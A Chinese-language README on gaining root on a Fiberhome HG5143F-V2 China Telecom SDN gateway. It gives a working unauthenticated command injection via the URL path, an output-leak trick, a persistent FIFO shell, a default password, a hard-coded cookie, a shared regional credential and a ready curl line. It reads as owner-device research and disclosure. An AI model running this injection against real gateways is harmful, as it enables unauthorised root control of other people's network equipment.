# 烽火 HG5143F-V2 电信 SDN 光猫开启 Root Shell

> 中国电信「智能随选网关」（SDN 版）本地提权与二次开发记录
> 固件 `FHQZ.4.0.0` · Broadcom **BCM68560** · aarch64 · Linux 4.1.52

---

## 0. 结论先行

| 目标 | 结果 |
|---|---|
| 打开 SSH / telnet | ❌ **做不到**（硬件转发层白名单，非配置问题） |
| 拿到 root shell | ✅ **可以**，走 Web 注入点 |
| 持久化交互式 shell | ✅ 可以，用 FIFO + 常驻 `sh`，见第 4 节 |
| 重启后保留改动 | ❌ `/` 是只读 squashfs，`/etc` 走内存 overlay，必回滚 |

一句话总结：**这台设备的 `22/23` 端口在交换芯片层面就被封死了，但它的 Web 服务里藏着一个 root 权限的命令注入点。**

网上流传的 `HG5143F 开 telnet` 教程（`/cgi-bin/telnetenable.cgi`、`192.168.1.1:8080/cgi-bin/luci`、`/html/logoffaccount.html`）针对的是**「天翼网关 4.0」**固件，和本文的**「智能随选网关（SDN）」**是两套完全不同的软件栈。本文所有结论均来自实机验证。

---

## 1. 设备与固件指纹

先确定自己在跟什么东西说话，避免拿错教程。

```bash
curl -s -i http://192.168.1.1/ | head -20
# Server: sdngw          <- 烽火 SDN 网关固件的 Web 服务名
```

| 项 | 值 |
|---|---|
| 厂商 / 型号 | Fiberhome **HG5143F-V2** |
| 硬件 / 软件版本 | V4.0.0 / **FHQZ.4.0.0** |
| 主控 | **BCM68560**（Broadcom，交换 + 硬件流表加速） |
| 系统 | aarch64，Linux **4.1.52** |
| 根文件系统 | `/` = ubiblock squashfs，**只读且 100% 占满** |
| 可写区 | `/tmp` = 222MB tmpfs；`/etc` 改动落在内存 overlay |
| Web 页面 | 仅 `login.html` `index.html` `reset.html` `setloid.html` `dhcpmsg.html` |

用设备的 `ctapi` 可以拿到全量身份信息（无需登录）：

```bash
ctapi sys get sys_all
```

```
sn:D8F507-XXXXXXXXXXXXXXXXXXXX
mac_address:D8:F5:07:XX:XX:XX
fw_version:FHQZ.4.0.0
hw_version:V4.0.0
model:HG5143F-V2
chipmodel:BCM68560
vendor:Fiberhome
region:SH
```

---

## 2. 认证机制（顺带的一个安全问题）

登录页只有一个管理密码框，实际请求是：

```
GET /login/passwd/<base64(密码)>
```

成功返回 `Set-Cookie: _SDNGWWEBTOKEN=20170601` 并跳转 `/index.html`。

做对照实验能确认它不是「任何密码都放行」：

| 输入 | 响应 |
|---|---|
| 正确密码 | 设 cookie → 跳 `/index.html` |
| 错误密码 | 跳回 `/login.html` |

> ⚠️ **两个安全问题**
> 1. 该型号出厂/默认管理密码为 `sdn123456`（本文实测有效）。弱口令 + 局域网可直达。
> 2. 认证 cookie 是**硬编码常量 `20170601`**，与会话无关，可被任意伪造。
>
> 也就是说：任何接入该局域网的人都能直接登进这台网关。建议在电信 App 内修改管理密码。

---

## 3. 注入点

灵感与初始线索来自 [haoqi366/SDN_research](https://github.com/haoqi366/SDN_research)。核心发现是 Web 服务把 **URL 路径**直接拼进了 shell 命令：

```sh
sh -c ctapi sys get secret_iv ;<URL 路径>
```

路径里的 `;` 完成了命令拼接。因此：

```
GET /config/drstrange/;id
```

即可执行 `id`，且直接是 **root**。

### 3.1 三个必须知道的约束

**① 只有 stderr 会回显**

CGI 不返回 stdout，只把 stderr 回显到 HTTP 响应体。所以要「偷」stdout，用 `mkdir` 把输出当成目录名参数，让报错信息把它吐出来：

```sh
mkdir -- "$(id)"
# -> mkdir: cannot create directory 'uid=0(root) gid=0(root)': No such file or directory
```

**② 空格和斜杠要换掉**

```
空格 -> ${IFS}
/    -> ${HOME}      # 本机 $HOME 恰好是 /
```

**③ 带 fd 的重定向会失效**

这一点很反直觉，踩过坑：

```sh
echo hi > /tmp/t1      # ✅ 可以，独立的 > 单独成词，仍被识别为重定向
cmd 2>/tmp/e           # ❌ 不行，2> 作为整体 token 展开后不再被解析为重定向
ffmpeg ... 2>file      #    → 目标程序会收到一个名叫 "2" 的普通参数
```

**结论：需要复杂引号 / 重定向时，把脚本 base64 写进文件再执行，别硬拼一行。**

### 3.2 客户端

`onu_shell.py` 是无状态单命令客户端：

```bash
python onu_shell.py "id"
python onu_shell.py "cat /etc/passwd"
```

---

## 4. 持久化 shell（本项目的主要贡献）

上面的注入点每次都是独立的 `sh -c`，没有状态：`cd` 不保留、变量不保留、后台进程活不过一次请求。

用 **FIFO + 常驻 sh** 解决：

```sh
#!/bin/sh
exec 9<>/tmp/.ci     # 关键：脚本自己以读写方式持有 FIFO
cd /
sh </tmp/.ci >/tmp/.co 2>&1
```

**为什么需要 `exec 9<>`：** FIFO 的读取端在最后一个写端关闭时会收到 EOF。如果只用 `echo cmd > /tmp/.ci` 逐条写入，每写完一次读取端就 EOF 退出，shell 只活一条命令。让脚本自身以 **O_RDWR** 打开并持有该 FIFO，写端就永远存在，读取端不会看到 EOF，一个 `sh` 可以跨无数条命令存活。

配套两点：

- **命令用 base64 传输** → 彻底绕开引号 / 空格 / 斜杠的转义地狱
- **哨兵判断输出结束** → 命令后追加 `echo __DONE__$?`，轮询 `/tmp/.co` 直到出现哨兵
- **分块读取** → `tail -c +N /tmp/.co | head -c 2400`，单次不超过 `PATH_MAX`（4096）

> 踩坑：外层脚本**不要**写成 `exec sh <fifo`。那样 argv 会变成裸 `sh`，`ps` 里再也认不出这个会话，无法做存活检测。

效果：

```
onu# cd /etc
onu# pwd
/etc
onu# X=42; echo $X
42
onu# ls /nope; echo rc=$?
ls: /nope: No such file or directory
rc=1
```

`cd`、变量、后台任务、stderr、退出码全部跨命令保留。用 `setsid` 起的进程能长期存活（实测 dropbear 连续运行十几分钟）。

`onu_console.py` 支持：

```bash
python onu_console.py                 # 交互式
python onu_console.py "df -h"         # 单条
python onu_console.py --restart       # 会话重建（重启后会自动重建，无需手动）
```

---

## 5. 为什么 22/23 端口永远打不开（负面结果，避免后来者踩坑）

这部分比成功经验更有价值——**不要再在这个方向上浪费时间**。

### 5.1 排除法

| 检查 | 结果 | 结论 |
|---|---|---|
| `iptables -L -n`（filter/nat/mangle/raw 四表） | **全空** | 不是 netfilter 拦的 |
| PC → 网关 `22/23/9999/8443` | 全部 **~2.0s 后 RST** | 不是丢包，是被主动回绝 |
| PC → 网关 `80` | 200，23ms | 只有 80 通 |
| `netstat -ln` | 22 端口 `0.0.0.0:22 LISTEN` | 服务起来了，但外面连不上 |

### 5.2 真正的根因：OVS 流表白名单

```bash
ovs-ofctl dump-flows SDN-bridge | grep 192.168.1.1
```

```
table=1 priority=125 tcp,nw_src=192.168.1.0/24,nw_dst=192.168.1.1,tp_dst=80 → resubmit(,4)
table=1 priority=125 tcp,nw_src=192.168.1.1,nw_dst=192.168.1.0/24,tp_src=80 → resubmit(,4)
```

**全表只有这两条把流量送往 CPU 口（`table=4 → output:100`）的放行规则，且只针对 80 端口。**

试着补一条 22 端口的镜像规则：

```bash
ovs-ofctl add-flow SDN-bridge "table=1,priority=125,tcp,tp_dst=22,actions=resubmit(,4)"
# ovs-ofctl: switch does not support any of the usable flow formats
ovs-ofctl -O OpenFlow13 add-flow ...
# OFPT_ERROR (OF1.3): OFPBRC_BAD_TYPE
```

这是**厂商改过的 OVS**（`/usr/ovs/sbin/cm` + `dm`，控制器 `tcp:15.192.24.125:6633`），只允许云端控制器装流，本地只读不写。

### 5.3 更底层：转发在交换芯片里

`ps` 里能看到：

```
bcmsw_rx          # Broadcom 交换芯片收包线程
bcmFlwStatsTask   # 硬件流表统计
recycle_sysb      # 缓冲区回收
```

数据转发、NAT、VLAN 全部在 BCM68560 的**硬件流表**里完成，CPU 只是旁挂管理面。芯片对非白名单端口直接回 RST —— 这就是那精确 2 秒的来源（DoS 防护特性）。

**所以 `sshd`/`telnetd` 起得来、`netstat` 看得见 LISTEN、但外部 SYN 到不了 CPU。软件层做任何事都没用。**

### 5.4 也试过、也失败的路径

- **抢 80 端口**：`killall micro_inetd` 后把 dropbear 挂到 80，能握手成功拿到 `SSH-2.0-dropbear_2019.78`，但随后进程被杀，且 **Web 管理页与注入通道同时失效，只能断电重启恢复**。已实测两次，不建议尝试。
- **IPv6 绕过**：流表白名单只写了 `nw_dst`（IPv4）。但 `ip -6 addr add fe80::1/64 dev si` 返回 `Permission denied` —— httpd 所在命名空间没有 `CAP_NET_ADMIN`，改不了接口。
- **自己传 busybox + telnetd**：设备自带 `/bin/busybox` v1.30.1 **未编译 telnetd**；Alpine 的 `busybox-static` 也没有；只有 Debian 的 `busybox-static` 带。但传上去也连不上，端口被芯片拦。（如果确实需要全量 busybox：`busybox-static_1.30.1-6+b3_arm64.deb`，aarch64 静态链接。）
- **改 OVS fail-mode**：`secure → standalone` 只在控制器失联时生效，控制器在线时不起作用。

### 5.5 唯一能拿到「真终端」的路

```bash
ps | grep getty
# 1113 root /sbin/getty -L ttyS0 0 vt100
```

**串口上已经有 login 提示符了。** 拆机找到主板 UART 焊盘，接 3.3V USB-TTL：

- 电平：**3.3V**（不要用 5V，会烧）
- 参数：**115200 8N1**
- 接线：TX↔RX 交叉、RX↔TX、GND↔GND（**VCC 不要接**）

这是唯一能拿到可交互、可 `scp`、可断线重连的真终端的路径。

---

## 6. 附：这台机器的网络架构（换光猫时有用）

虽然是从 dump 里顺带挖出来的，但对「把这台换成自己的光猫/光模块」很有价值。

### 6.1 多命名空间设计

```bash
ip netns list
# APP  FM  MNG  NM  obox  acprobe
```

| 命名空间 | 接口 | 地址 | 用途 |
|---|---|---|---|
| `NM` | `si` | 192.168.1.1/24 | LAN / Web |
| `MNG` | `manager` | 由 `udhcpc` 获取 | 管理 WAN（TR-069） |
| `FM` | `foi` | 192.168.1.254/24 | 光纤管理面 |
| `APP` | `appi` | 192.168.1.253/24 | 应用沙箱 |
| `obox` | `SDN-out-default` | 192.168.1.1/24 | 上网 WAN 容器 |

### 6.2 VLAN 与 MAC 分配

来自 `/usr/init_scripts/create_vlandev.sh` 的原文注释：

```
# veip0.1(for PPP):  vlan00  -  basemac+2
# manager:           vlan46  -  basemac+3
# iptv.xx(1):        vlan85  -  basemac+4
# iptv.xx(2):        vlan51  -  basemac+5
# sip:               vlan46  -  basemac+6
```

| 业务 | VLAN | MAC 偏移 |
|---|---|---|
| 上网（PPPoE） | 0（不打标签） | base **+2** |
| 管理 TR-069 | **46** | base **+3** |
| IPTV 1 | **85** | base **+4** |
| IPTV 2 | **51** | base **+5** |
| VoIP SIP | 46 | base **+6** |

基础 MAC 在 `/var/run/base_mac`。各业务 MAC 由此递增派生 —— **部分局端按 MAC 做绑定，换猫时要照着配。**

> 注意：实际 VLAN 值由云端控制器运行时下发（`create_WAN.sh` 的 `$vlanid` 参数），上表是默认映射关系。上海地区管理 VLAN 固定 46。

### 6.3 控制器与 DNS

```bash
# /usr/etc/dm_addr.conf
# <Region> <HA address> <MNG vlan> <NTP> <login msg>
SH  sgwauth.edatahome.com  46  15.192.251.5|15.192.252.5  c2RuMTIzNDU2
```

- 登录报文 base64 `c2RuMTIzNDU2` 解码 = `sdn123456`
- 该报文为**区域内所有设备共用的固定凭据**，不是每机随机
- SDN 控制器：`tcp:15.192.24.125:6633`
- DNS：`15.192.252.188` / `15.192.251.188`（电信上海）
- NTP：`15.192.251.5` / `15.192.252.5`

### 6.4 PON 注册参数

```bash
ctapi pon get loid        # LOID
ctapi pon get gpon_sn     # ONU SN（hex）
ctapi pon get pon_type    # 10GEPON
ctapi pon get pon_state   # success
```

`gpon_sn` 返回十六进制，前 4 字节是厂商前缀（Fiberhome = `46485454` = ASCII `FHTT`）。

> ⚠️ **LOID 相当于这条线路在光路里的身份证**，与宽带账号绑定。公开仓库里请务必打码。

---

## 7. 快速上手

```bash
# 1. 确认注入点存在（返回 000 = 固件没有这个洞，直接放弃）
curl -s -o /dev/null -w "%{http_code}\n" "http://192.168.1.1/config/drstrange/;id"

# 2. 单命令
python onu_shell.py "id"

# 3. 持久 shell
python onu_console.py
```

无需登录。`/config/drstrange/` 这个注入点不校验认证。

---

## 8. 免責 / 合规

- 本文仅针对**自己拥有或已获授权**的设备。未经授权访问他人网络设备在绝大多数司法辖区都是违法的。
- 修改 `/etc`、启动服务、写交换芯片寄存器都有变砖风险。`/` 是只读 squashfs，误改根分区可能导致无法启动，只能靠串口或返修恢复。
- 拆机接线接错电平会**永久损坏**设备（3.3V，别接 VCC）。
- 文中涉及的默认密码、cookie 常量等问题，属于厂商侧的安全缺陷。**请勿用于攻击他人设备**；如果你是自己设备的用户，建议向运营商报备并修改密码。

---

## 9. 鸣谢

本项目的起点完全来自 **[haoqi366/SDN_research](https://github.com/haoqi366/SDN_research)**。

那篇研究首次公开了这条利用链最关键的一环 —— Web 服务把 URL 路径直接拼进
`sh -c "ctapi sys get secret_iv ;<路径>"`，也是「用 `mkdir $(cmd)` 把 stdout 借 stderr 带出来」
这一技巧的来源。没有它，本文大概率会停在「22/23 端口打不开、网上教程全不适用」这一步。

本文在其基础上的增量主要有四点：

- 确认该注入点在 **FHQZ.4.0.0（智能随选网关 / SDN 版）** 上依然有效，且**直接就是 root**
- 逐层定位 **22/23 端口不可达的真正原因**：OVS 表 1 只有 `tp_dst=80` 两条白名单流，
  转发实体在 BCM68560 硬件；并记录了 `ovs-ofctl add-flow` 被 `OFPBRC_BAD_TYPE` 拒绝这一关键负面结果
- 把一次性命令通道改造成**持久化交互式 shell**（`exec 9<>` 持有 FIFO，避免读端收到 EOF）
- 补上该机型的**网络架构 dump**（命名空间 / VLAN-MAC 派生 / 控制器），供换光猫时对照

原仓库的许可条款请以其仓库内声明为准。

其他参考：

- Broadcom `vlanctl` / OVS `ovs-ofctl` 官方文档
- Linux `openflow` / OVS 流表相关 man page

---

## 10. 文件说明

| 文件 | 说明 |
|---|---|
| `onu_shell.py` | 无状态单命令客户端（最小实现，适合排错） |
| `onu_console.py` | 持久化交互式 shell（FIFO + 常驻 `sh`） |
| `docs/network-dump.md` | 实机网络配置 dump（换猫参考） |
